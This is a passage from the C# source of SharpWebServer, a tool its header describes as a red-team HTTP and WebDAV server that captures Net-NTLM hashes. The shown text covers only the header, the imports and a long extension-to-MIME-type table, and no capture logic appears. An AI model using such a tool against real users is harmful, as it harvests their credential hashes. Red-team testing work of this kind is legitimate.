//
// SharpWebServer
//
// Purpose:
//   A Red Team oriented C# Simple HTTP & WebDAV Server with Net-NTLM hashes capture functionality.
//   Requires .NET Framework 4.5 and System.Net and System.Net.Sockets references.
//
// This project borrows code from:
//   - NTLM hashes capture code & TCP Listener backbone borrowed from MDSec ActiveBreach Farmer project written by Dominic Chell (@domchell):
//      https://github.com/mdsecactivebreach/Farmer
//
// Patchworked by:
//   Mariusz B. / mgeeky, '21, <mb [at] binary-offensive.com>
//

using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Net.NetworkInformation;
using System.IO;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Xml;
using System.Text;

namespace SharpWebServer
{
    public class SharpWebServer
    {
        private readonly string[] _IndexFiles = {
            "index.html",
            "index.htm",
            "default.html",
            "default.htm"
        };

        static private string outputToFile = "";

        private static IDictionary<string, string> _MimeTypeMappings = new Dictionary<string, string>(StringComparer.InvariantCultureIgnoreCase) {
            #region extension to MIME type list
             {".123", "application/vnd.lotus-1-2-3"},
             {".3dml", "text/vnd.in3d.3dml"},
             {".3g2", "video/3gpp2"},
             {".3gp", "video/3gpp"},
             {".a", "application/octet-stream"},
             {".aab", "application/x-authorware-bin"},
             {".aac", "audio/x-aac"},
             {".aam", "application/x-authorware-map"},
             {".aas", "application/x-authorware-seg"},
             {".abw", "application/x-abiword"},
             {".acc", "application/vnd.americandynamics.acc"},
             {".ace", "application/x-ace-compressed"},
             {".acu", "application/vnd.acucobol"},
             {".acutc", "application/vnd.acucorp"},
             {".adp", "audio/adpcm"},
             {".aep", "application/vnd.audiograph"},
             {".afm", "application/x-font-type1"},
             {".afp", "application/vnd.ibm.modcap"},
             {".ai", "application/postscript"},
             {".aif", "audio/x-aiff"},
             {".aifc", "audio/x-aiff"},
             {".aiff", "audio/x-aiff"},
             {".air", "application/vnd.adobe.air-application-installer-package+zip"},
             {".ami", "application/vnd.amiga.ami"},
             {".apk", "application/vnd.android.package-archive"},
             {".application", "application/x-ms-application"},
             {".apr", "application/vnd.lotus-approach"},
             {".asc", "application/pgp-signature"},
             {".asf", "video/x-ms-asf"},
             {".asm", "text/x-asm"},
             {".aso", "application/vnd.accpac.simply.aso"},
             {".asx", "video/x-ms-asf"},
             {".atc", "application/vnd.acucorp"},
             {".atom", "application/atom+xml"},
             {".atomcat", "application/atomcat+xml"},
             {".atomsvc", "application/atomsvc+xml"},
             {".atx", "application/vnd.antix.game-component"},
             {".au", "audio/basic"},
             {".avi", "video/x-msvideo"},
             {".aw", "application/applixware"},
             {".azf", "application/vnd.airzip.filesecure.azf"},
             {".azs", "application/vnd.airzip.filesecure.azs"},
             {".azw", "application/vnd.amazon.ebook"},
             {".bat", "application/x-msdownload"},
             {".bcpio", "application/x-bcpio"},
             {".bdf", "application/x-font-bdf"},
             {".bdm", "application/vnd.syncml.dm+wbxml"},
             {".bh2", "application/vnd.fujitsu.oasysprs"},
             {".bin", "application/octet-stream"},
             {".bmi", "application/vnd.bmi"},
             {".bmp", "image/bmp"},
             {".book", "application/vnd.framemaker"},
             {".box", "application/vnd.previewsystems.box"},
             {".boz", "application/x-bzip2"},
             {".bpk", "application/octet-stream"},
             {".btif", "image/prs.btif"},
             {".bz", "application/x-bzip"},
             {".bz2", "application/x-bzip2"},
             {".c", "text/x-c"},
             {".c4d", "application/vnd.clonk.c4group"},
             {".c4f", "application/vnd.clonk.c4group"},
             {".c4g", "application/vnd.clonk.c4group"},
             {".c4p", "application/vnd.clonk.c4group"},
             {".c4u", "application/vnd.clonk.c4group"},
             {".cab", "application/vnd.ms-cab-compressed"},
             {".car", "application/vnd.curl.car"},
             {".cat", "application/vnd.ms-pki.seccat"},
             {".cc", "text/x-c"},
             {".cct", "application/x-director"},
             {".ccxml", "application/ccxml+xml"},
             {".cdbcmsg", "application/vnd.contact.cmsg"},
             {".cdf", "application/x-netcdf"},
             {".cdkey", "application/vnd.mediastation.cdkey"},
             {".cdx", "chemical/x-cdx"},
             {".cdxml", "application/vnd.chemdraw+xml"},
             {".cdy", "application/vnd.cinderella"},
             {".cer", "application/pkix-cert"},
             {".cgm", "image/cgm"},
             {".chat", "application/x-chat"},
             {".chm", "application/vnd.ms-htmlhelp"},
             {".chrt", "application/vnd.kde.kchart"},
             {".cif", "chemical/x-cif"},
             {".cii", "application/vnd.anser-web-certificate-issue-initiation"},
             {".cil", "application/vnd.ms-artgalry"},
             {".cla", "application/vnd.claymore"},
             {".class", "application/java-vm"},
             {".clkk", "application/vnd.crick.clicker.keyboard"},
             {".clkp", "application/vnd.crick.clicker.palette"},
             {".clkt", "application/vnd.crick.clicker.template"},
             {".clkw", "application/vnd.crick.clicker.wordbank"},
             {".clkx", "application/vnd.crick.clicker"},
             {".clp", "application/x-msclip"},
             {".cmc", "application/vnd.cosmocaller"},
             {".cmdf", "chemical/x-cmdf"},
             {".cml", "chemical/x-cml"},
             {".cmp", "application/vnd.yellowriver-custom-menu"},
             {".cmx", "image/x-cmx"},
             {".cod", "application/vnd.rim.cod"},
             {".com", "application/x-msdownload"},
             {".conf", "text/plain"},
             {".cpio", "application/x-cpio"},
             {".cpp", "text/x-c"},
             {".cpt", "application/mac-compactpro"},
             {".crd", "application/x-mscardfile"},
             {".crl", "application/pkix-crl"},
             {".crt", "application/x-x509-ca-cert"},
             {".csh", "application/x-csh"},
             {".csml", "chemical/x-csml"},
             {".csp", "application/vnd.commonspace"},
             {".css", "text/css"},
             {".cst", "application/x-director"},
             {".csv", "text/csv"},
             {".cu", "application/cu-seeme"},
             {".curl", "text/vnd.curl"},
             {".cww", "application/prs.cww"},
             {".cxt", "application/x-director"},
             {".cxx", "text/x-c"},
             {".daf", "application/vnd.mobius.daf"},
             {".dataless", "application/vnd.fdsn.seed"},
             {".davmount", "application/davmount+xml"},
             {".dcr", "application/x-director"},
             {".dcurl", "text/vnd.curl.dcurl"},
             {".dd2", "application/vnd.oma.dd2+xml"},
             {".ddd", "application/vnd.fujixerox.ddd"},
             {".deb", "application/x-debian-package"},
             {".def", "text/plain"},
             {".deploy", "application/octet-stream"},
             {".der", "application/x-x509-ca-cert"},
             {".dfac", "application/vnd.dreamfactory"},
             {".dic", "text/x-c"},
             {".diff", "text/plain"},
             {".dir", "application/x-director"},
             {".dis", "application/vnd.mobius.dis"},
             {".dist", "application/octet-stream"},
             {".distz", "application/octet-stream"},
             {".djv", "image/vnd.djvu"},
             {".djvu", "image/vnd.djvu"},
             {".dll", "application/x-msdownload"},
             {".dmg", "application/octet-stream"},
             {".dms", "application/octet-stream"},
             {".dna", "application/vnd.dna"},
             {".doc", "application/msword"},
             {".docm", "application/vnd.ms-word.document.macroenabled.12"},
             {".docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document"},
             {".dot", "application/msword"},
             {".dotm", "application/vnd.ms-word.template.macroenabled.12"},
             {".dotx", "application/vnd.openxmlformats-officedocument.wordprocessingml.template"},
             {".dp", "application/vnd.osgi.dp"},
             {".dpg", "application/vnd.dpgraph"},
             {".dsc", "text/prs.lines.tag"},
             {".dtb", "application/x-dtbook+xml"},
             {".dtd", "application/xml-dtd"},
             {".dts", "audio/vnd.dts"},
             {".dtshd", "audio/vnd.dts.hd"},
             {".dump", "application/octet-stream"},
             {".dvi", "application/x-dvi"},
             {".dwf", "model/vnd.dwf"},
             {".dwg", "image/vnd.dwg"},
             {".dxf", "image/vnd.dxf"},
             {".dxp", "application/vnd.spotfire.dxp"},
             {".dxr", "application/x-director"},
             {".ecelp4800", "audio/vnd.nuera.ecelp4800"},
             {".ecelp7470", "audio/vnd.nuera.ecelp7470"},
             {".ecelp9600", "audio/vnd.nuera.ecelp9600"},
             {".ecma", "application/ecmascript"},
             {".edm", "application/vnd.novadigm.edm"},
             {".edx", "application/vnd.novadigm.edx"},
             {".efif", "application/vnd.picsel"},
             {".ei6", "application/vnd.pg.osasli"},
             {".elc", "application/octet-stream"},
             {".eml", "message/rfc822"},
             {".emma", "application/emma+xml"},
             {".eol", "audio/vnd.digital-winds"},
             {".eot", "application/vnd.ms-fontobject"},
             {".eps", "application/postscript"},
             {".epub", "application/epub+zip"},
             {".es3", "application/vnd.eszigno3+xml"},
             {".esf", "application/vnd.epson.esf"},
             {".et3", "application/vnd.eszigno3+xml"},
             {".etx", "text/x-setext"},
             {".exe", "application/x-msdownload"},
             {".ext", "application/vnd.novadigm.ext"},
             {".ez", "application/andrew-inset"},
             {".ez2", "application/vnd.ezpix-album"},
             {".ez3", "application/vnd.ezpix-package"},
             {".f", "text/x-fortran"},
             {".f4v", "video/x-f4v"},
             {".f77", "text/x-fortran"},
             {".f90", "text/x-fortran"},
             {".fbs", "image/vnd.fastbidsheet"},
             {".fdf", "application/vnd.fdf"},
             {".fe_launch", "application/vnd.denovo.fcselayout-link"},
             {".fg5", "application/vnd.fujitsu.oasysgp"},
             {".fgd", "application/x-director"},
             {".fh", "image/x-freehand"},
             {".fh4", "image/x-freehand"},
             {".fh5", "image/x-freehand"},
             {".fh7", "image/x-freehand"},
             {".fhc", "image/x-freehand"},
             {".fig", "application/x-xfig"},
             {".fli", "video/x-fli"},
             {".flo", "application/vnd.micrografx.flo"},
             {".flv", "video/x-flv"},
             {".flw", "application/vnd.kde.kivio"},
             {".flx", "text/vnd.fmi.flexstor"},
             {".fly", "text/vnd.fly"},
             {".fm", "application/vnd.framemaker"},
             {".fnc", "application/vnd.frogans.fnc"},
             {".for", "text/x-fortran"},
             {".fpx", "image/vnd.fpx"},
             {".frame", "application/vnd.framemaker"},
             {".fsc", "application/vnd.fsc.weblaunch"},
             {".fst", "image/vnd.fst"},
             {".ftc", "application/vnd.fluxtime.clip"},
             {".fti", "application/vnd.anser-web-funds-transfer-initiation"},
             {".fvt", "video/vnd.fvt"},
             {".fzs", "application/vnd.fuzzysheet"},
             {".g3", "image/g3fax"},
             {".gac", "application/vnd.groove-account"},
             {".gdl", "model/vnd.gdl"},
             {".geo", "application/vnd.dynageo"},
             {".gex", "application/vnd.geometry-explorer"},
             {".ggb", "application/vnd.geogebra.file"},
             {".ggt", "application/vnd.geogebra.tool"},
             {".ghf", "application/vnd.groove-help"},
             {".gif", "image/gif"},
             {".gim", "application/vnd.groove-identity-message"},
             {".gmx", "application/vnd.gmx"},
             {".gnumeric", "application/x-gnumeric"},
             {".gph", "application/vnd.flographit"},
             {".gqf", "application/vnd.grafeq"},
             {".gqs", "application/vnd.grafeq"},
             {".gram", "application/srgs"},
             {".gre", "application/vnd.geometry-explorer"},
             {".grv", "application/vnd.groove-injector"},
             {".grxml", "application/srgs+xml"},
             {".gsf", "application/x-font-ghostscript"},
             {".gtar", "application/x-gtar"},
             {".gtm", "application/vnd.groove-tool-message"},
             {".gtw", "model/vnd.gtw"},
             {".gv", "text/vnd.graphviz"},
             {".gz", "application/x-gzip"},
             {".h", "text/x-c"},
             {".h261", "video/h261"},
             {".h263", "video/h263"},
             {".h264", "video/h264"},
             {".hbci", "application/vnd.hbci"},
             {".hdf", "application/x-hdf"},
             {".hh", "text/x-c"},
             {".hlp", "application/winhlp"},
             {".hpgl", "application/vnd.hp-hpgl"},
             {".hpid", "application/vnd.hp-hpid"},
             {".hps", "application/vnd.hp-hps"},
             {".hqx", "application/mac-binhex40"},
             {".htke", "application/vnd.kenameaapp"},
             {".htm", "text/html"},
             {".html", "text/html"},
             {".hvd", "application/vnd.yamaha.hv-dic"},
             {".hvp", "application/vnd.yamaha.hv-voice"},
             {".hvs", "application/vnd.yamaha.hv-script"},
             {".icc", "application/vnd.iccprofile"},
             {".ice", "x-conference/x-cooltalk"},
             {".icm", "application/vnd.iccprofile"},
             {".ico", "image/x-icon"},
             {".ics", "text/calendar"},
             {".ief", "image/ief"},
             {".ifb", "text/calendar"},
             {".ifm", "application/vnd.shana.informed.formdata"},
             {".iges", "model/iges"},
             {".igl", "application/vnd.igloader"},
             {".igs", "model/iges"},
             {".igx", "application/vnd.micrografx.igx"},
             {".iif", "application/vnd.shana.informed.interchange"},
             {".imp", "application/vnd.accpac.simply.imp"},
             {".ims", "application/vnd.ms-ims"},
             {".in", "text/plain"},
             {".ipk", "application/vnd.shana.informed.package"},
             {".irm", "application/vnd.ibm.rights-management"},
             {".irp", "application/vnd.irepository.package+xml"},
             {".iso", "application/octet-stream"},
             {".itp", "application/vnd.shana.informed.formtemplate"},
             {".ivp", "application/vnd.immervision-ivp"},
             {".ivu", "application/vnd.immervision-ivu"},
             {".jad", "text/vnd.sun.j2me.app-descriptor"},
             {".jam", "application/vnd.jam"},
             {".jar", "application/java-archive"},
             {".java", "text/x-java-source"},
             {".jisp", "application/vnd.jisp"},
             {".jlt", "application/vnd.hp-jlyt"},
             {".jnlp", "application/x-java-jnlp-file"},
             {".joda", "application/vnd.joost.joda-archive"},
             {".jpe", "image/jpeg"},
             {".jpeg", "image/jpeg"},
             {".jpg", "image/jpeg"},
             {".jpgm", "video/jpm"},
             {".jpgv", "video/jpeg"},
             {".jpm", "video/jpm"},
             {".js", "application/javascript"},
             {".json", "application/json"},
             {".kar", "audio/midi"},
             {".karbon", "application/vnd.kde.karbon"},
             {".kfo", "application/vnd.kde.kformula"},
             {".kia", "application/vnd.kidspiration"},
             {".kil", "application/x-killustrator"},
             {".kml", "application/vnd.google-earth.kml+xml"},
             {".kmz", "application/vnd.google-earth.kmz"},
             {".kne", "application/vnd.kinar"},
             {".knp", "application/vnd.kinar"},
             {".kon", "application/vnd.kde.kontour"},
             {".kpr", "application/vnd.kde.kpresenter"},
             {".kpt", "application/vnd.kde.kpresenter"},
             {".ksh", "text/plain"},
             {".ksp", "application/vnd.kde.kspread"},
             {".ktr", "application/vnd.kahootz"},
             {".ktz", "application/vnd.kahootz"},
             {".kwd", "application/vnd.kde.kword"},
             {".kwt", "application/vnd.kde.kword"},
             {".latex", "application/x-latex"},
             {".lbd", "application/vnd.llamagraphics.life-balance.desktop"},
             {".lbe", "application/vnd.llamagraphics.life-balance.exchange+xml"},
             {".les", "application/vnd.hhe.lesson-player"},
             {".lha", "application/octet-stream"},
             {".link66", "application/vnd.route66.link66+xml"},
             {".list", "text/plain"},
             {".list3820", "application/vnd.ibm.modcap"},
             {".listafp", "application/vnd.ibm.modcap"},
             {".log", "text/plain"},
             {".lostxml", "application/lost+xml"},
             {".lrf", "application/octet-stream"},
             {".lrm", "application/vnd.ms-lrm"},
             {".ltf", "application/vnd.frogans.ltf"},
             {".lvp", "audio/vnd.lucent.voice"},
             {".lwp", "application/vnd.lotus-wordpro"},
             {".lzh", "application/octet-stream"},
             {".m13", "application/x-msmediaview"},
             {".m14", "application/x-msmediaview"},
             {".m1v", "video/mpeg"},
             {".m2a", "audio/mpeg"},
             {".m2v", "video/mpeg"},
             {".m3a", "audio/mpeg"},
             {".m3u", "audio/x-mpegurl"},
             {".m4u", "video/vnd.mpegurl"},
             {".m4v", "video/x-m4v"},
             {".ma", "application/mathematica"},
             {".mag", "application/vnd.ecowin.chart"},
             {".maker", "application/vnd.framemaker"},
             {".man", "text/troff"},
             {".mathml", "application/mathml+xml"},
             {".mb", "application/mathematica"},
             {".mbk", "application/vnd.mobius.mbk"},
             {".mbox", "application/mbox"},
             {".mc1", "application/vnd.medcalcdata"},
             {".mcd", "application/vnd.mcd"},
             {".mcurl", "text/vnd.curl.mcurl"},
             {".mdb", "application/x-msaccess"},
             {".mdi", "image/vnd.ms-modi"},
             {".me", "text/troff"},
             {".mesh", "model/mesh"},
             {".mfm", "application/vnd.mfmp"},
             {".mgz", "application/vnd.proteus.magazine"},
             {".mht", "message/rfc822"},
             {".mhtml", "message/rfc822"},
             {".mid", "audio/midi"},
             {".midi", "audio/midi"},
             {".mif", "application/vnd.mif"},
             {".mime", "message/rfc822"},
             {".mj2", "video/mj2"},
             {".mjp2", "video/mj2"},
             {".mlp", "application/vnd.dolby.mlp"},
             {".mmd", "application/vnd.chipnuts.karaoke-mmd"},
             {".mmf", "application/vnd.smaf"},
             {".mmr", "image/vnd.fujixerox.edmics-mmr"},
             {".mny", "application/x-msmoney"},
             {".mobi", "application/x-mobipocket-ebook"},
             {".mov", "video/quicktime"},
             {".movie", "video/x-sgi-movie"},
             {".mp2", "audio/mpeg"},
             {".mp2a", "audio/mpeg"},
             {".mp3", "audio/mpeg"},
             {".mp4", "video/mp4"},
             {".mp4a", "audio/mp4"},
             {".mp4s", "application/mp4"},
             {".mp4v", "video/mp4"},
             {".mpa", "video/mpeg"},
             {".mpc", "application/vnd.mophun.certificate"},
             {".mpe", "video/mpeg"},
             {".mpeg", "video/mpeg"},
             {".mpg", "video/mpeg"},
             {".mpg4", "video/mp4"},
             {".mpga", "audio/mpeg"},
             {".mpkg", "application/vnd.apple.installer+xml"},
             {".mpm", "application/vnd.blueice.multipass"},
             {".mpn", "application/vnd.mophun.application"},
             {".mpp", "application/vnd.ms-project"},
             {".mpt", "application/vnd.ms-project"},
             {".mpy", "application/vnd.ibm.minipay"},
             {".mqy", "application/vnd.mobius.mqy"},
             {".mrc", "application/marc"},
             {".ms", "text/troff"},
             {".mscml", "application/mediaservercontrol+xml"},
             {".mseed", "application/vnd.fdsn.mseed"},
             {".mseq", "application/vnd.mseq"},
             {".msf", "application/vnd.epson.msf"},
             {".msh", "model/mesh"},
             {".msi", "application/x-msdownload"},
             {".msl", "application/vnd.mobius.msl"},
             {".msty", "application/vnd.muvee.style"},
             {".mts", "model/vnd.mts"},
             {".mus", "application/vnd.musician"},
             {".musicxml", "application/vnd.recordare.musicxml+xml"},
             {".mvb", "application/x-msmediaview"},
             {".mwf", "application/vnd.mfer"},
             {".mxf", "application/mxf"},
             {".mxl", "application/vnd.recordare.musicxml"},
             {".mxml", "application/xv+xml"},
             {".mxs", "application/vnd.triscape.mxs"},
             {".mxu", "video/vnd.mpegurl"},
             {".n-gage", "application/vnd.nokia.n-gage.symbian.install"},
             {".nb", "application/mathematica"},
             {".nc", "application/x-netcdf"},
             {".ncx", "application/x-dtbncx+xml"},
             {".ngdat", "application/vnd.nokia.n-gage.data"},
             {".nlu", "application/vnd.neurolanguage.nlu"},
             {".nml", "application/vnd.enliven"},
             {".nnd", "application/vnd.noblenet-directory"},
             {".nns", "application/vnd.noblenet-sealer"},
             {".nnw", "application/vnd.noblenet-web"},
             {".npx", "image/vnd.net-fpx"},
             {".nsf", "application/vnd.lotus-notes"},
             {".nws", "message/rfc822"},
             {".o", "application/octet-stream"},
             {".oa2", "application/vnd.fujitsu.oasys2"},
             {".oa3", "application/vnd.fujitsu.oasys3"},
             {".oas", "application/vnd.fujitsu.oasys"},
             {".obd", "application/x-msbinder"},
             {".obj", "application/octet-stream"},
             {".oda", "application/oda"},
             {".odb", "application/vnd.oasis.opendocument.database"},
             {".odc", "application/vnd.oasis.opendocument.chart"},
             {".odf", "application/vnd.oasis.opendocument.formula"},
             {".odft", "application/vnd.oasis.opendocument.formula-template"},
             {".odg", "application/vnd.oasis.opendocument.graphics"},
             {".odi", "application/vnd.oasis.opendocument.image"},
             {".odp", "application/vnd.oasis.opendocument.presentation"},
             {".ods", "application/vnd.oasis.opendocument.spreadsheet"},
             {".odt", "application/vnd.oasis.opendocument.text"},
             {".oga", "audio/ogg"},
             {".ogg", "audio/ogg"},
             {".ogv", "video/ogg"},
             {".ogx", "application/ogg"},
             {".onepkg", "application/onenote"},
             {".onetmp", "application/onenote"},
             {".onetoc", "application/onenote"},
             {".onetoc2", "application/onenote"},
             {".opf", "application/oebps-package+xml"},
             {".oprc", "application/vnd.palm"},
             {".org", "application/vnd.lotus-organizer"},
             {".osf", "application/vnd.yamaha.openscoreformat"},
             {".osfpvg", "application/vnd.yamaha.openscoreformat.osfpvg+xml"},
             {".otc", "application/vnd.oasis.opendocument.chart-template"},
             {".otf", "application/x-font-otf"},
             {".otg", "application/vnd.oasis.opendocument.graphics-template"},
             {".oth", "application/vnd.oasis.opendocument.text-web"},
             {".oti", "application/vnd.oasis.opendocument.image-template"},
             {".otm", "application/vnd.oasis.opendocument.text-master"},
             {".otp", "application/vnd.oasis.opendocument.presentation-template"},
             {".ots", "application/vnd.oasis.opendocument.spreadsheet-template"},
             {".ott", "application/vnd.oasis.opendocument.text-template"},
             {".oxt", "application/vnd.openofficeorg.extension"},
             {".p", "text/x-pascal"},
             {".p10", "application/pkcs10"},
             {".p12", "application/x-pkcs12"},
             {".p7b", "application/x-pkcs7-certificates"},
             {".p7c", "application/pkcs7-mime"},
             {".p7m", "application/pkcs7-mime"},
             {".p7r", "application/x-pkcs7-certreqresp"},
             {".p7s", "application/pkcs7-signature"},
             {".pas", "text/x-pascal"},
             {".pbd", "application/vnd.powerbuilder6"},
             {".pbm", "image/x-portable-bitmap"},
             {".pcf", "application/x-font-pcf"},
             {".pcl", "application/vnd.hp-pcl"},
             {".pclxl", "application/vnd.hp-pclxl"},
             {".pct", "image/x-pict"},
             {".pcurl", "application/vnd.curl.pcurl"},
             {".pcx", "image/x-pcx"},
             {".pdb", "application/vnd.palm"},
             {".pdf", "application/pdf"},
             {".pfa", "application/x-font-type1"},
             {".pfb", "application/x-font-type1"},
             {".pfm", "application/x-font-type1"},
             {".pfr", "application/font-tdpfr"},
             {".pfx", "application/x-pkcs12"},
             {".pgm", "image/x-portable-graymap"},
             {".pgn", "application/x-chess-pgn"},
             {".pgp", "application/pgp-encrypted"},
             {".pic", "image/x-pict"},
             {".pkg", "application/octet-stream"},
             {".pki", "application/pkixcmp"},
             {".pkipath", "application/pkix-pkipath"},
             {".pl", "text/plain"},
             {".plb", "application/vnd.3gpp.pic-bw-large"},
             {".plc", "application/vnd.mobius.plc"},
             {".plf", "application/vnd.pocketlearn"},
             {".pls", "application/pls+xml"},
             {".pml", "application/vnd.ctc-posml"},
             {".png", "image/png"},
             {".pnm", "image/x-portable-anymap"},
             {".portpkg", "application/vnd.macports.portpkg"},
             {".pot", "application/vnd.ms-powerpoint"},
             {".potm", "application/vnd.ms-powerpoint.template.macroenabled.12"},
             {".potx", "application/vnd.openxmlformats-officedocument.presentationml.template"},
             {".ppa", "application/vnd.ms-powerpoint"},
             {".ppam", "application/vnd.ms-powerpoint.addin.macroenabled.12"},
             {".ppd", "application/vnd.cups-ppd"},
             {".ppm", "image/x-portable-pixmap"},
             {".pps", "application/vnd.ms-powerpoint"},
             {".ppsm", "application/vnd.ms-powerpoint.slideshow.macroenabled.12"},
             {".ppsx", "application/vnd.openxmlformats-officedocument.presentationml.slideshow"},
             {".ppt", "application/vnd.ms-powerpoint"},
             {".pptm", "application/vnd.ms-powerpoint.presentation.macroenabled.12"},
             {".pptx", "application/vnd.openxmlformats-officedocument.presentationml.presentation"},
             {".pqa", "application/vnd.palm"},
             {".prc", "application/x-mobipocket-ebook"},
             {".pre", "application/vnd.lotus-freelance"},
             {".prf", "application/pics-rules"},
             {".ps", "application/postscript"},
             {".psb", "application/vnd.3gpp.pic-bw-small"},
             {".psd", "image/vnd.adobe.photoshop"},
             {".psf", "application/x-font-linux-psf"},
             {".ptid", "application/vnd.pvi.ptid1"},
             {".pub", "application/x-mspublisher"},
             {".pvb", "application/vnd.3gpp.pic-bw-var"},
             {".pwn", "application/vnd.3m.post-it-notes"},
             {".pwz", "application/vnd.ms-powerpoint"},
             {".py", "text/x-python"},
             {".pya", "audio/vnd.ms-playready.media.pya"},
             {".pyc", "application/x-python-code"},
             {".pyo", "application/x-python-code"},
             {".pyv", "video/vnd.ms-playready.media.pyv"},
             {".qam", "application/vnd.epson.quickanime"},
             {".qbo", "application/vnd.intu.qbo"},
             {".qfx", "application/vnd.intu.qfx"},
             {".qps", "application/vnd.publishare-delta-tree"},
             {".qt", "video/quicktime"},
             {".qwd", "application/vnd.quark.quarkxpress"},
             {".qwt", "application/vnd.quark.quarkxpress"},
             {".qxb", "application/vnd.quark.quarkxpress"},
             {".qxd", "application/vnd.quark.quarkxpress"},
             {".qxl", "application/vnd.quark.quarkxpress"},
             {".qxt", "application/vnd.quark.quarkxpress"},
             {".ra", "audio/x-pn-realaudio"},
             {".ram", "audio/x-pn-realaudio"},
             {".rar", "application/x-rar-compressed"},
             {".ras", "image/x-cmu-raster"},
             {".rcprofile", "application/vnd.ipunplugged.rcprofile"},
             {".rdf", "application/rdf+xml"},
             {".rdz", "application/vnd.data-vision.rdz"},
             {".rep", "application/vnd.businessobjects"},
             {".res", "application/x-dtbresource+xml"},
             {".rgb", "image/x-rgb"},
             {".rif", "application/reginfo+xml"},
             {".rl", "application/resource-lists+xml"},
             {".rlc", "image/vnd.fujixerox.edmics-rlc"},
             {".rld", "application/resource-lists-diff+xml"},
             {".rm", "application/vnd.rn-realmedia"},
             {".rmi", "audio/midi"},
             {".rmp", "audio/x-pn-realaudio-plugin"},
             {".rms", "application/vnd.jcp.javame.midlet-rms"},
             {".rnc", "application/relax-ng-compact-syntax"},
             {".roff", "text/troff"},
             {".rpm", "application/x-rpm"},
             {".rpss", "application/vnd.nokia.radio-presets"},
             {".rpst", "application/vnd.nokia.radio-preset"},
             {".rq", "application/sparql-query"},
             {".rs", "application/rls-services+xml"},
             {".rsd", "application/rsd+xml"},
             {".rss", "application/rss+xml"},
             {".rtf", "application/rtf"},
             {".rtx", "text/richtext"},
             {".s", "text/x-asm"},
             {".saf", "application/vnd.yamaha.smaf-audio"},
             {".sbml", "application/sbml+xml"},
             {".sc", "application/vnd.ibm.secure-container"},
             {".scd", "application/x-msschedule"},
             {".scm", "application/vnd.lotus-screencam"},
             {".scq", "application/scvp-cv-request"},
             {".scs", "application/scvp-cv-response"},
             {".scurl", "text/vnd.curl.scurl"},
             {".sda", "application/vnd.stardivision.draw"},
             {".sdc", "application/vnd.stardivision.calc"},
             {".sdd", "application/vnd.stardivision.impress"},
             {".sdkd", "application/vnd.solent.sdkm+xml"},
             {".sdkm", "application/vnd.solent.sdkm+xml"},
             {".sdp", "application/sdp"},
             {".sdw", "application/vnd.stardivision.writer"},
             {".see", "application/vnd.seemail"},
             {".seed", "application/vnd.fdsn.seed"},
             {".sema", "application/vnd.sema"},
             {".semd", "application/vnd.semd"},
             {".semf", "application/vnd.semf"},
             {".ser", "application/java-serialized-object"},
             {".setpay", "application/set-payment-initiation"},
             {".setreg", "application/set-registration-initiation"},
             {".sfd-hdstx", "application/vnd.hydrostatix.sof-data"},
             {".sfs", "application/vnd.spotfire.sfs"},
             {".sgl", "application/vnd.stardivision.writer-global"},
             {".sgm", "text/sgml"},
             {".sgml", "text/sgml"},
             {".sh", "application/x-sh"},
             {".shar", "application/x-shar"},
             {".shf", "application/shf+xml"},
             {".si", "text/vnd.wap.si"},
             {".sic", "application/vnd.wap.sic"},
             {".sig", "application/pgp-signature"},
             {".silo", "model/mesh"},
             {".sis", "application/vnd.symbian.install"},
             {".sisx", "application/vnd.symbian.install"},
             {".sit", "application/x-stuffit"},
             {".sitx", "application/x-stuffitx"},
             {".skd", "application/vnd.koan"},
             {".skm", "application/vnd.koan"},
             {".skp", "application/vnd.koan"},
             {".skt", "application/vnd.koan"},
             {".sl", "text/vnd.wap.sl"},
             {".slc", "application/vnd.wap.slc"},
             {".sldm", "application/vnd.ms-powerpoint.slide.macroenabled.12"},
             {".sldx", "application/vnd.openxmlformats-officedocument.presentationml.slide"},
             {".slt", "application/vnd.epson.salt"},
             {".smf", "application/vnd.stardivision.math"},
             {".smi", "application/smil+xml"},
             {".smil", "application/smil+xml"},
             {".snd", "audio/basic"},
             {".snf", "application/x-font-snf"},
             {".so", "application/octet-stream"},
             {".spc", "application/x-pkcs7-certificates"},
             {".spf", "application/vnd.yamaha.smaf-phrase"},
             {".spl", "application/x-futuresplash"},
             {".spot", "text/vnd.in3d.spot"},
             {".spp", "application/scvp-vp-response"},
             {".spq", "application/scvp-vp-request"},
             {".spx", "audio/ogg"},
             {".src", "application/x-wais-source"},
             {".srx", "application/sparql-results+xml"},
             {".sse", "application/vnd.kodak-descriptor"},
             {".ssf", "application/vnd.epson.ssf"},
             {".ssml", "application/ssml+xml"},
             {".stc", "application/vnd.sun.xml.calc.template"},
             {".std", "application/vnd.sun.xml.draw.template"},
             {".stf", "application/vnd.wt.stf"},
             {".sti", "application/vnd.sun.xml.impress.template"},
             {".stk", "application/hyperstudio"},
             {".stl", "application/vnd.ms-pki.stl"},
             {".str", "application/vnd.pg.format"},
             {".stw", "application/vnd.sun.xml.writer.template"},
             {".sus", "application/vnd.sus-calendar"},
             {".susp", "application/vnd.sus-calendar"},
             {".sv4cpio", "application/x-sv4cpio"},
             {".sv4crc", "application/x-sv4crc"},
             {".svd", "application/vnd.svd"},
             {".svg", "image/svg+xml"},
             {".svgz", "image/svg+xml"},
             {".swa", "application/x-director"},
             {".swf", "application/x-shockwave-flash"},
             {".swi", "application/vnd.arastra.swi"},
             {".sxc", "application/vnd.sun.xml.calc"},
             {".sxd", "application/vnd.sun.xml.draw"},
             {".sxg", "application/vnd.sun.xml.writer.global"},
             {".sxi", "application/vnd.sun.xml.impress"},
             {".sxm", "application/vnd.sun.xml.math"},
             {".sxw", "application/vnd.sun.xml.writer"},
             {".t", "text/troff"},
             {".tao", "application/vnd.tao.intent-module-archive"},
             {".tar", "application/x-tar"},
             {".tcap", "application/vnd.3gpp2.tcap"},
             {".tcl", "application/x-tcl"},
             {".teacher", "application/vnd.smart.teacher"},
             {".tex", "application/x-tex"},
             {".texi", "application/x-texinfo"},
             {".texinfo", "application/x-texinfo"},
             {".text", "text/plain"},
             {".tfm", "application/x-tex-tfm"},
             {".tgz", "application/x-gzip"},
             {".tif", "image/tiff"},
             {".tiff", "image/tiff"},
             {".tmo", "application/vnd.tmobile-livetv"},
             {".torrent", "application/x-bittorrent"},
             {".tpl", "application/vnd.groove-tool-template"},
             {".tpt", "application/vnd.trid.tpt"},
             {".tr", "text/troff"},
             {".tra", "application/vnd.trueapp"},
